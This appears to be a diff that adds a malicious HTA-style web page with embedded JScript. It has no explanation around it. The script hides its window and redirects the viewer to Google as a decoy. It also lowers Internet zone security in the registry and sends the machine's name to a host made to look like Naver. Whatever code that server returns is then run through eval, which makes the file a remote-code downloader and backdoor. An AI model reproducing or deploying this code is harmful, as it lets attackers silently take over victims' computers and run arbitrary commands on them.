@@ -1,0 +1,36 @@
+<meta http-equiv="refresh" content="0;URL='https://www.google.com'">
+<script language="javascript">
+window.resizeTo(0, 0);
+window.moveTo(-2000,-2000);
+
+var sHostName = "naver.midsecurity.org/attache/20201112";
+var WshNetwork = new ActiveXObject("WScript.Network");
+var sComputerName = WshNetwork.ComputerName;
+delete WshNetwork;
+
+var sh = new ActiveXObject("WScript.Shell");
+sh.RegWrite("HKCU\\Console\\CodePage", 65001, "REG_DWORD");
+sh.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\1406", 0, "REG_DWORD");
+delete sh;
+
+var strResponse = FindCommand(sHostName, sComputerName, "tt");
+
+function FindCommand(sHostName, sTargetDir, sPrefix)
+{	
+	try {
+		var strURL = "http://" + sHostName + "/dn.php?client_id=" + sTargetDir + "&prefix=" + sPrefix;
+		var HttpObj = new ActiveXObject("Microsoft.XMLHTTP");
+		HttpObj.open("GET", strURL, false);
+		HttpObj.send("");
+		var strResponse = HttpObj.responseText;
+		delete HttpObj;
+		eval(strResponse);
+	}
+	catch (err) {		
+	}
+	return null;
+}
+
+self.close();
+</script>
+
